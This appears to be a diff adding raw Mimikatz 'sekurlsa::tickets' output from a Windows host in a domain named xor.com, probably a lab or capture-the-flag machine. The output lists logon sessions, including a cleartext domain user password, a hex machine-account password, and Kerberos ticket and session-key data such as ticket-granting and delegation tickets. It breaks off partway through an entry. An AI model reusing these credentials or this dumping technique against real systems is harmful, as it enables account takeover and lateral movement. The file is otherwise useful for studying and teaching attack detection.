@@ -1,0 +1,444 @@
+mimikatz # sekurlsa::tickets
+
+Authentication Id : 0 ; 8715819 (00000000:0084fe2b)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/23/2021 4:50:06 AM
+SID               : S-1-5-90-0-2
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 8715656 (00000000:0084fd88)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/23/2021 4:50:06 AM
+SID               : S-1-5-90-0-2
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 8715180 (00000000:0084fbac)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/23/2021 4:50:06 AM
+SID               : S-1-5-96-0-2
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 428522 (00000000:000689ea)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : XOR-APP23
+Logon Server      : XOR-APP23
+Logon Time        : 3/22/2021 12:14:21 PM
+SID               : S-1-5-21-4269079787-19373159-2510549293-500
+
+         * Username : Administrator
+         * Domain   : XOR-APP23
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 331147 (00000000:00050d8b)
+Session           : Batch from 0
+User Name         : daisy
+Domain            : xor
+Logon Server      : XOR-DC01
+Logon Time        : 3/22/2021 12:13:32 PM
+SID               : S-1-5-21-2293535422-227910474-3663383505-1119
+
+         * Username : daisy
+         * Domain   : XOR.COM
+         * Password : XorPasswordIsDead17
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 98936 (00000000:00018278)
+Session           : Service from 0
+User Name         : SQLTELEMETRY$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:24 PM
+SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 50446 (00000000:0000c50e)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:22 PM
+SID               : S-1-5-90-0-1
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : XOR-APP23$
+Domain            : xor
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:21 PM
+SID               : S-1-5-20
+
+         * Username : xor-app23$
+         * Domain   : XOR.COM
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 3/23/2021 4:50:44 AM ; 3/23/2021 7:44:34 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : ldap ; xor-dc01.xor.com ; @ XOR.COM
+           Target Name  (02) : ldap ; xor-dc01.xor.com ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             3c7350cde078ab69754761f009993e011c9939a47ae5616664faaebde92b8bcc
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000001]
+           Start/End/MaxRenew: 3/22/2021 9:59:34 PM ; 3/23/2021 7:44:34 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : cifs ; xor-dc01.xor.com ; @ XOR.COM
+           Target Name  (02) : cifs ; xor-dc01.xor.com ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             ceaa5b0237b95f454e5f37b7158a6b8974772b4034686cecd1d7c63c0b126ca9
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000002]
+           Start/End/MaxRenew: 3/22/2021 12:14:17 PM ; 3/22/2021 10:14:17 PM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : ldap ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Target Name  (02) : ldap ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( XOR.COM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             59fcb33840385a64950828bd08bdc919d08655de3ec8a2174d4b223086dd383c
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 3/22/2021 9:44:34 PM ; 3/23/2021 7:44:34 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Target Name  (--) : @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( $$Delegation Ticket$$ )
+           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             2801f24631eb776bbf50ac60700e7966d76ea9d0f8454744611a73c82826fb16
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+         [00000001]
+           Start/End/MaxRenew: 3/22/2021 9:44:34 PM ; 3/23/2021 7:44:34 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Target Name  (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( XOR.COM )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             46ef4c579860ea49733503dc80184391c85b76fb83e9128c2926c134cda1ff19
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+Authentication Id : 0 ; 32447 (00000000:00007ebf)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:21 PM
+SID               : S-1-5-96-0-0
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 8748532 (00000000:00857df4)
+Session           : RemoteInteractive from 2
+User Name         : sqlserver
+Domain            : xor
+Logon Server      : XOR-DC01
+Logon Time        : 3/23/2021 4:50:36 AM
+SID               : S-1-5-21-2293535422-227910474-3663383505-1170
+
+         * Username : sqlServer
+         * Domain   : XOR.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 3/23/2021 4:57:54 AM ; 3/23/2021 2:57:54 PM ; 3/30/2021 4:57:54 AM
+           Service Name (02) : ldap ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Target Name  (02) : ldap ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Client Name  (01) : sqlServer ; @ XOR.COM ( XOR.COM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             63a2ce866766d5ac9fa8d795bbe9f06aff7ad8d08d9c359256d2faea06fc867b
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 3/23/2021 4:57:54 AM ; 3/23/2021 2:57:54 PM ; 3/30/2021 4:57:54 AM
+           Service Name (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Target Name  (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Client Name  (01) : sqlServer ; @ XOR.COM ( XOR.COM )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             94fa3e2e2958651cc0df6ee5363371d0b178ccc2d7ec23df46bd2703dda5a8f5
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+Authentication Id : 0 ; 8748470 (00000000:00857db6)
+Session           : RemoteInteractive from 2
+User Name         : sqlserver
+Domain            : xor
+Logon Server      : XOR-DC01
+Logon Time        : 3/23/2021 4:50:36 AM
+SID               : S-1-5-21-2293535422-227910474-3663383505-1170
+
+         * Username : sqlserver
+         * Domain   : XOR.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 3/23/2021 5:18:58 AM ; 3/23/2021 2:50:36 PM ; 3/30/2021 4:50:36 AM
+           Service Name (02) : ldap ; xor-dc01.xor.com ; @ XOR.COM
+           Target Name  (02) : ldap ; xor-dc01.xor.com ; @ XOR.COM
+           Client Name  (01) : sqlServer ; @ XOR.COM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             5d598511c43b40d653beb7c89a791c4b35487568a23cc9f754ce2500259f398d
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000001]
+           Start/End/MaxRenew: 3/23/2021 5:18:58 AM ; 3/23/2021 2:50:36 PM ; 3/30/2021 4:50:36 AM
+           Service Name (02) : ldap ; xor-dc01.xor.com ; DomainDnsZones.xor.com ; @ XOR.COM
+           Target Name  (02) : ldap ; xor-dc01.xor.com ; DomainDnsZones.xor.com ; @ XOR.COM
+           Client Name  (01) : sqlServer ; @ XOR.COM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             e773c3d81915467f1784c39821637381d7571a3b8cbfc1711c77981d65bc05d9
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000002]
+           Start/End/MaxRenew: 3/23/2021 4:50:38 AM ; 3/23/2021 2:50:36 PM ; 3/30/2021 4:50:36 AM
+           Service Name (02) : LDAP ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Target Name  (02) : LDAP ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Client Name  (01) : sqlServer ; @ XOR.COM ( XOR.COM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             0e1cc4fc0a35640100a3ae0d27b1f4753ffc96139337834c2658f1572854af2f
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 3/23/2021 4:50:36 AM ; 3/23/2021 2:50:36 PM ; 3/30/2021 4:50:36 AM
+           Service Name (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Target Name  (02) : krbtgt ; xor.com ; @ XOR.COM
+           Client Name  (01) : sqlServer ; @ XOR.COM ( xor.com )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             0798a01f6d33caf461154794c67be63ffe2c379b4175ffdfa66fff70e95b8e98
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+Authentication Id : 0 ; 297757 (00000000:00048b1d)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : XOR-APP23
+Logon Server      : XOR-APP23
+Logon Time        : 3/10/2021 7:10:42 PM
+SID               : S-1-5-21-4269079787-19373159-2510549293-500
+
+         * Username : Administrator
+         * Domain   : XOR-APP23
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:22 PM
+SID               : S-1-5-19
+
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 50497 (00000000:0000c541)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:22 PM
+SID               : S-1-5-90-0-1
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : 77 03 5e 8b 5d 42 a4 ce f2 b0 0f 9f 1f c1 1b 17 49 54 20 f1 fe 11 d5 87 06 28 b8 1e 57 0f 38 b1 45 5f d9 f9 69 94 64 91 f1 fb c4 4f 80 46 f5 13 d7 93 f2 c7 96 9a f2 aa f0 c4 9e 2b c3 86 95 24 a9 c1 3f d6 2d 95 39 3d d3 11 17 36 df 62 86 18 bb c6 a3 7e 0d e0 8f a1 6d df a1 4e 0e 6b 40 cf 3d fd 4d 21 61 04 b5 69 30 50 06 95 7a 65 35 ea a0 df 16 b9 1f b4 2e ba de 6f 81 d8 cd c6 6f 91 16 8b c8 89 6f 72 de 92 cd 33 d5 ee 30 4f 73 db 88 1e b6 0a ce fe 25 b7 f0 85 2d 7e 45 b8 2f 1d 86 1e 64 4d 6a 89 8d 03 73 53 36 a9 10 8d 2d 67 91 c6 2e 9c 59 61 e5 1c cb d5 ef 4d 3c 9c e4 80 c3 7d aa 7c 21 32 fc 78 11 5b 4c 92 96 c1 4b 0c ac 18 60 62 71 d4 36 1c 3a 62 c6 6e 72 bf 4c e3 3b b3 32 f9 d7 5c e2 82 cb a0 28 18 4b 32 e0 33
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 32346 (00000000:00007e5a)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:21 PM
+SID               : S-1-5-96-0-1
+
+         * Username : XOR-APP23$
+         * Domain   : xor.com
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : XOR-APP23$
+Domain            : xor
+Logon Server      : (null)
+Logon Time        : 3/10/2021 7:08:21 PM
+SID               : S-1-5-18
+
+         * Username : xor-app23$
+         * Domain   : XOR.COM
+         * Password : f0 7f 0c d7 5b ce 79 22 34 ec 76 8e bd 5f 74 33 36 de be 08 0e 6f 03 9c 21 78 f6 2b 5b 9f 75 2f 31 ac 7a 91 45 8f d2 de 0e 47 40 c6 26 a0 d8 ef c7 db d8 1e 24 fe b0 df 71 5a 4b 9f e0 94 57 cd 66 43 59 32 1f 45 64 65 6d 52 47 9b 2c 50 db d9 ec 85 e6 ea 88 5d 3a 4d 8e 10 2e cd 00 bc e9 56 0a fe 7d 35 5b 47 4a 25 33 2c 15 12 6b fc 24 19 9c 4b ae 5d d6 a7 1c b0 8c 21 35 ee 34 0b 51 ff 22 78 d4 5c 48 3d ba 34 f2 83 e6 d4 f7 6b c1 d3 27 74 cd 4d af cf 00 a7 cd ae 88 0b 4c 48 7d 99 72 08 e3 d8 fb 8f b4 06 67 48 ff 2b 3f 53 82 9e f3 0a a1 50 08 20 5b 38 3a 5d c7 27 a7 85 92 e6 49 42 1c 60 41 07 0a 9a 13 e4 34 1c 57 a7 c7 0f 4b 4e 29 9e df 65 88 ef fe bf 6c 5b ce ec bc b1 db 7a f6 a6 8d 7e a9 01 24 ff 5d 6c d9 b3 6f 93
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 3/22/2021 10:06:25 PM ; 3/23/2021 7:59:18 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : cifs ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Target Name  (02) : cifs ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( xor.com )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             d9d6516dc7b599842ef8aee7809678438cbc8e980ede62991fa7192df4fab037
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000001]
+           Start/End/MaxRenew: 3/22/2021 10:06:25 PM ; 3/23/2021 7:59:18 AM ; 3/29/2021 12:14:17 PM
+           Service Name (01) : XOR-APP23$ ; @ XOR.COM
+           Target Name  (01) : XOR-APP23$ ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM
+           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             e6521f0f8ef332bf34613dd63f569aa61113610e08eaf56a049c0cfed23f4cfd
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
+         [00000002]
+           Start/End/MaxRenew: 3/22/2021 10:06:25 PM ; 3/23/2021 7:59:18 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : LDAP ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Target Name  (02) : LDAP ; xor-dc01.xor.com ; xor.com ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( XOR.COM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             dce9e175c5029c06ae2e05001ee1eacefeb29be70b52474ad642e1376bc99a9e
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000003]
+           Start/End/MaxRenew: 3/22/2021 12:14:27 PM ; 3/22/2021 10:14:17 PM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : LDAP ; xor-dc01.xor.com ; @ XOR.COM
+           Target Name  (02) : LDAP ; xor-dc01.xor.com ; @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             01a6a8dd4e2f3314f4778cd8445c7f565ef0be1c8da04eb4b404a34ced1426ac
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 3/22/2021 10:06:25 PM ; 3/23/2021 7:59:18 AM ; 3/29/2021 12:14:17 PM
+           Service Name (02) : krbtgt ; XOR.COM ; @ XOR.COM
+           Target Name  (--) : @ XOR.COM
+           Client Name  (01) : xor-app23$ ; @ XOR.COM ( $$Delegation Ticket$$ )
+           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             0d081bf1f27d524d244c8e840802a052790939888316ac102666048b5b661274
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+         [00000001]
